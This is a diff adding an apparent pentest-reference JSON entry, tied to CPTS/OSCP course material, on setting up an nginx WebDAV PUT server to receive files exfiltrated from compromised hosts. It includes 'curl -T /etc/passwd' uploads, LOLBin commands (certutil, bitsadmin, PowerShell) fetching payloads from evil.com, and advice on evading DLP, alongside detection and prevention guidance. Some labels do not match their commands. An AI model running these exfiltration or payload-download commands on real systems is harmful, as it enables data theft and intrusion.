@@ -1,0 +1,131 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "nginx",
+    "curl"
+  ],
+  "tags": [
+    "nginx",
+    "upload",
+    "put"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Web Servers",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "CPTS Ch07 — full nginx PUT upload setup",
+      "command": "sudo mkdir -p /var/www/uploads/SecretUploadDirectory\nsudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n# write config, enable, restart\nsudo systemctl restart nginx.service\ncurl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt"
+    },
+    {
+      "label": "Debug bind conflict",
+      "command": "sudo tail -2 /var/log/nginx/error.log\nss -lnpt | grep 80\nsudo rm /etc/nginx/sites-enabled/default\nsudo systemctl restart nginx.service"
+    }
+  ],
+  "notes": "Troubleshoot: tail -2 /var/log/nginx/error.log ; ss -lnpt | grep 80 ; ps -ef | grep <pid>. nginx WebDAV PUT lets clients upload via curl -T without any Python/Ruby server. Common port conflict: apache2 or Python may already own port 80 — remove default site or use alternate port (9001). The directory must be owned by www-data. Also covered in: CPTS Ch07 (File Transfers).",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-upload",
+      "rel": "next",
+      "note": "Target PUTs loot to this receiver."
+    },
+    {
+      "id": "nix-upload",
+      "rel": "next",
+      "note": "Linux target uploads here."
+    }
+  ],
+  "id": "nginx-upload-catch",
+  "name": "Hosting - Catch Files via Nginx PUT",
+  "command": "curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt",
+  "description": "Configure Nginx with WebDAV PUT to reliably receive uploaded files (handles large/binary better than simple servers). Upload with curl -T.",
+  "steps": [
+    {
+      "label": "1. Create + own the upload dir",
+      "command": "sudo mkdir -p /var/www/uploads/SecretUploadDirectory\nsudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory"
+    },
+    {
+      "label": "2. Nginx site (upload.conf: listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; })",
+      "command": "sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\nsudo rm /etc/nginx/sites-enabled/default\nsudo systemctl restart nginx.service"
+    },
+    {
+      "label": "3. Upload + verify",
+      "command": "curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt\nsudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "An attacker configures nginx with WebDAV PUT enabled (dav_methods PUT) on an upload directory to CATCH files uploaded from a compromised host - the receiving end of an exfil/transfer.",
+    "prerequisites": "An attacker-controlled nginx server with a writable upload location and the target able to reach it.",
+    "impact": "Provides a reliable endpoint to receive files exfiltrated from the target over HTTP.",
+    "detection": "On the victim side this looks like an outbound HTTP PUT to an external host - unusual for most processes; egress/DLP monitoring catches the upload; command line of the uploading tool.",
+    "artifacts": "An outbound HTTP PUT to the attacker nginx; the uploading process's network connection; DLP hits on the content.",
+    "prevention": "[MITRE T1048 M1037] Egress filtering + DLP on outbound PUT/POST to unknown hosts; restrict which hosts can reach the internet.",
+    "evasion": "Upload over HTTPS to blend with web traffic; the catch-server is attacker-side, so only the outbound flow is target-visible - encrypt content to defeat DLP.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  },
+  "variations": [
+    {
+      "description": "Create upload directory with correct ownership",
+      "command": "sudo mkdir -p /var/www/uploads/SecretUploadDirectory\nsudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory",
+      "label": "Read uploaded file"
+    },
+    {
+      "description": "Write nginx site config with WebDAV PUT enabled",
+      "command": "cat > /etc/nginx/sites-available/upload.conf << 'EOF'\nserver {\n    listen 9001;\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\nEOF",
+      "label": "Write nginx config"
+    },
+    {
+      "description": "Enable site and restart nginx",
+      "command": "sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\nsudo systemctl restart nginx.service",
+      "label": "Enable site (symlink)"
+    },
+    {
+      "description": "Debug nginx port conflict (if bind fails)",
+      "command": "sudo tail -2 /var/log/nginx/error.log\nss -lnpt | grep 80\nps -ef | grep <pid>\nsudo rm /etc/nginx/sites-enabled/default",
+      "label": "Watch error log"
+    },
+    {
+      "description": "Upload file via curl PUT to nginx endpoint",
+      "command": "curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt",
+      "label": "GET request"
+    },
+    {
+      "description": "Verify uploaded file on server",
+      "command": "sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt",
+      "label": "tail"
+    }
+  ]
+}
